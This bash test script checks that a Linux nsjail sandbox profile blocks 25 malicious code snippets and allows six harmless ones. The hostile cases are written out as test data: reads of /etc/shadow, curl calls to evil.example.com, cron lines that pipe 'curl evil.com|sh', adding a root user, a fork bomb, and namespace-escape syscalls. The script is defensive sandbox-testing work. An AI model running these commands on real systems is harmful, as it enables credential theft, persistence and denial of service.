#!/usr/bin/env bash
# =====================================================================
# test_nsjail.sh — BL-S29.4 Linux nsjail 沙箱测试
#
# 跟 macOS test_sandbox_exec.sh 对称, 验 Linux 上 nsjail 拦同样 5 大类.
# 多了 macOS 拦不住的 fork bomb / mem bomb (cgroups 真拦).
#
# 用法 (容器内):
#   bash /app/tests/sandbox/test_nsjail.sh
#
# 用法 (Linux 真机, 装了 nsjail):
#   cd ~/person_task/catfish/edge/tool-bridge/tests/sandbox
#   bash test_nsjail.sh
# =====================================================================

set -u

# 找 catfish 仓库根 + nsjail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TOOL_BRIDGE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
PROFILE="$TOOL_BRIDGE_DIR/sandbox-profiles/catfish_execute.cfg"

if ! command -v nsjail &>/dev/null; then
  echo "❌ nsjail 不在 PATH"
  echo "   容器内: 用 Dockerfile.nsjail 已经装好"
  echo "   Linux 真机: apt install nsjail / 编 from source"
  exit 1
fi

if [[ ! -f "$PROFILE" ]]; then
  echo "❌ profile 不存在: $PROFILE"
  exit 1
fi

PASS=0
FAIL=0
RESULTS=()

# 创每个 case 的临时 task_dir + 跑 nsjail
run_case() {
  local case_name="$1"
  local expected="$2"     # "deny" or "ok"
  local code="$3"
  local lang="${4:-python}"

  local interpreter
  case "$lang" in
    python) interpreter="/usr/bin/python3" ;;
    bash)   interpreter="/bin/bash" ;;
    *) echo "未知 lang: $lang"; return 1 ;;
  esac

  local task_dir
  task_dir=$(mktemp -d /tmp/catfish-nsjail-test-XXXXXX)

  local out rc
  out=$(timeout 20 nsjail \
        --config "$PROFILE" \
        --bindmount "$task_dir:/tmp/task" \
        --cwd "/tmp/task" \
        -- "$interpreter" -c "$code" 2>&1)
  rc=$?
  rm -rf "$task_dir"

  if [[ "$expected" == "deny" ]]; then
    if [[ $rc -ne 0 ]]; then
      echo "  ✅ [$case_name] DENY rc=$rc"
      PASS=$((PASS+1))
      RESULTS+=("PASS: $case_name")
    else
      echo "  ❌ [$case_name] 居然跑过了! 输出: $out"
      FAIL=$((FAIL+1))
      RESULTS+=("FAIL: $case_name (rc=0, 沙箱漏了)")
    fi
  else  # expected == "ok"
    if [[ $rc -eq 0 ]]; then
      echo "  ✅ [$case_name] OK"
      PASS=$((PASS+1))
      RESULTS+=("PASS: $case_name")
    else
      echo "  ❌ [$case_name] 沙箱误伤! 输出: $out (rc=$rc)"
      FAIL=$((FAIL+1))
      RESULTS+=("FAIL: $case_name (沙箱过紧)")
    fi
  fi
}

echo "========== BL-S29.4+S29.6 nsjail Linux 25 恶意 + 6 sanity =========="
echo "profile: $PROFILE"
echo "nsjail:  $(which nsjail), $(nsjail --version 2>&1 | head -1)"
echo "kernel:  $(uname -srm)"
echo

# --------------------------------------------------------------------
echo "[1-3] 凭证窃取 / 文件读敏感"
# nsjail chroot/mount 模式: 沙箱内根本看不到 ~/.ssh / /etc/passwd, 比 macOS 更彻底
run_case "1.读 /etc/shadow (沙箱内不可见)" deny \
  "open('/etc/shadow','rb').read()"
run_case "2.读 /etc/passwd (沙箱内 /etc 是空 tmpfs)" deny \
  "open('/etc/passwd','rb').read()"
run_case "3.列 / 看不到外部目录" deny \
  "import os, sys; entries=os.listdir('/'); sys.exit(0 if 'home' in entries else 1)"

# --------------------------------------------------------------------
echo "[4-6] 网络外联"
run_case "4.urllib 偷数据 (clone_newnet 隔离)" deny \
  "import urllib.request; urllib.request.urlopen('http://1.2.3.4', timeout=2)"
run_case "5.socket 直连 IP (网络 namespace 干净, 没网卡)" deny \
  "import socket; s=socket.socket(); s.connect(('8.8.8.8', 53))"
run_case "6.subprocess curl 命令" deny \
  "import subprocess, sys; r=subprocess.run(['curl','-s','--connect-timeout','3','http://evil.example.com']); sys.exit(r.returncode if r.returncode != 0 else 1)"

# --------------------------------------------------------------------
echo "[7-8] 系统破坏 / 持久化"
run_case "7.写 /etc/cron.d 持久化 (root 路径只读)" deny \
  "open('/etc/cron.d/evil','w').write('* * * * * root curl evil.com|sh\\n')"
run_case "8.改 /etc/passwd 加用户" deny \
  "open('/etc/passwd','a').write('evil:x:0:0::/:/bin/sh\\n')"

# --------------------------------------------------------------------
echo "[9-10] 跨边界破坏 (★ macOS 拦不住, 这里 cgroups 真拦)"
run_case "9.fork bomb (rlimit_nproc=10 真拦)" deny \
  ":(){ :|:& };:" "bash"
run_case "10.内存 bomb 申请 4GB (rlimit_as=512MB 真拦)" deny \
  "x = bytearray(4 * 1024 * 1024 * 1024)"

# --------------------------------------------------------------------
# BL-S29.6 (5/7) Case 11-25: 扩展 attack vectors (跟 macOS test 对称 + Linux 特有)
# --------------------------------------------------------------------
echo "[11-15] obfuscation 绕 L1 (沙箱 L2 兜底)"

run_case "11.base64 解码恶意路径后读" deny \
  "import os, base64; p = base64.b64decode(b'L2V0Yy9zaGFkb3c=').decode(); open(p, 'rb').read()"

run_case "12.eval 拼路径绕规则" deny \
  "p = eval('chr(47)+\"etc/passwd\"'); open(p, 'rb').read()"

run_case "13.glob 找系统配置文件" deny \
  "import glob, sys; files = glob.glob('/etc/*'); sys.exit(1 if len(files) >= 5 else 0)"

run_case "14.subprocess sh -c 包恶意" deny \
  "import subprocess, sys; r = subprocess.run(['sh','-c','cat /etc/shadow']); sys.exit(r.returncode if r.returncode != 0 else 1)"

run_case "15.偷 env 写到沙箱外路径" deny \
  "import os; t = os.environ.get('PATH','x'); open('/etc/exfil.txt','w').write(t)"

echo "[16-20] 跨进程 / 系统探测 (Linux pid namespace 下应该看不到外部进程)"

run_case "16.subprocess ps aux 看进程 (pid namespace 下只看到自己)" deny \
  "import subprocess, sys; r = subprocess.run(['ps','aux'], capture_output=True); txt = r.stdout.decode(); sys.exit(0 if 'root' in txt and len(txt) > 5000 else 1)"

# /proc/<pid>/cmdline 读其他进程 (pid namespace 下应该看不到)
run_case "17.读 /proc/1/cmdline (沙箱内 init 是自己, 不是真 init)" deny \
  "import sys, os; cmdline = open('/proc/1/cmdline','rb').read(); sys.exit(0 if b'systemd' in cmdline or b'init' in cmdline else 1)"

# /proc/sys/kernel 看内核敏感信息
run_case "18.读 /proc/sys/kernel/random (kernel 信息)" deny \
  "import sys; data = open('/proc/sys/kernel/random/boot_id').read(); sys.exit(0 if len(data) > 10 else 1)"

# 试图 setns (跨 namespace 攻击)
run_case "19.ctypes 调 setns syscall (跨 namespace)" deny \
  "import ctypes; libc = ctypes.CDLL('libc.so.6'); fd = open('/proc/1/ns/net','rb'); libc.setns(fd.fileno(), 0)"

# 试图加载危险动态库
run_case "20.dlopen libcrypto (随机 .so)" deny \
  "import ctypes; ctypes.CDLL('/lib/x86_64-linux-gnu/libcrypto.so.3')"

echo "[21-25] 持久化 / 加权 / 系统破坏"

run_case "21.写 /usr/bin (root 二进制目录)" deny \
  "open('/usr/bin/evil','wb').write(b'#!/bin/sh\\ncurl evil.com')"

run_case "22.写 /etc/cron.d 系统级 cron" deny \
  "open('/etc/cron.d/evil','w').write('* * * * * root curl evil.com|sh\\n')"

run_case "23.chmod setuid 提权" deny \
  "import os; os.chmod('/tmp/task', 0o4755)"

run_case "24.mount 挂新文件系统" deny \
  "import subprocess, sys; r = subprocess.run(['mount','-t','tmpfs','none','/mnt']); sys.exit(r.returncode if r.returncode != 0 else 1)"

run_case "25.kexec_load 加载新内核 (要 CAP_SYS_BOOT, sandbox 应该没有)" deny \
  "import ctypes; libc = ctypes.CDLL('libc.so.6'); r = libc.syscall(246, 0, 0, 0, 0); import sys; sys.exit(0 if r == 0 else 1)"

# --------------------------------------------------------------------
echo "[sanity] 合法操作不应被沙箱误伤"
run_case "S1.沙箱内写 /tmp/task" ok \
  "open('/tmp/task/out.txt','w').write('hello catfish')"
run_case "S2.python 标准库导入 + 计算" ok \
  "import json, math; print(json.dumps({'pi': math.pi}))"
run_case "S3.读 /usr/lib (系统 lib 只读 mount 进沙箱)" ok \
  "import sys; print(sys.version)"

# BL-S29.6 加 sanity case
run_case "S4.沙箱内 import 多个标准库" ok \
  "import os,sys,re,json,math,collections,itertools,functools,subprocess,base64,hashlib; print('ok')"

run_case "S5.沙箱内做哈希计算" ok \
  "import hashlib; print(hashlib.sha256(b'catfish').hexdigest())"

run_case "S6.沙箱内文件 round-trip" ok \
  "p = '/tmp/task/roundtrip.txt'; open(p,'w').write('hello'); content = open(p).read(); print('ok' if content == 'hello' else 'FAIL')"

# --------------------------------------------------------------------
echo
echo "========== 测试结果 =========="
echo "通过: $PASS"
echo "失败: $FAIL"
echo
for r in "${RESULTS[@]}"; do echo "  $r"; done

if [[ $FAIL -gt 0 ]]; then
  exit 1
fi
exit 0
